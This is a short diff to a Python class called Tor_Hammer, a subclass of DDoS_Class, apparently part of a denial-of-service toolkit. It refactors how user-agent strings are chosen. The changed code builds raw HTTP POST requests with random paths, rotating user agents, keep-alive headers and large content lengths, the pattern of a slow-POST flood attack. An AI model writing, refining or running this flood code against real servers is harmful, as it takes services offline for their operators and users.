@@ -24,8 +24,6 @@ class Tor_Hammer(DDoS_Class):
         self.fails=0
         self.cookie = cookie
         self.user_agents = user_agents
-        if not self.user_agents or len(self.user_agents) == 0:
-            self.user_agents = Common_Variables.user_agents_list
         self.max_content = max_content
         self.min_content = min_content
         self.stop = False
@@ -76,7 +74,7 @@ class Tor_Hammer(DDoS_Class):
                             "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                 random.choice(self.paths),
                                 ck,
-                                random.choice(self.user_agents),
+                                self.get_user_agent(),
                                 random.randint(300, 1000),
                                 q,
                                 (
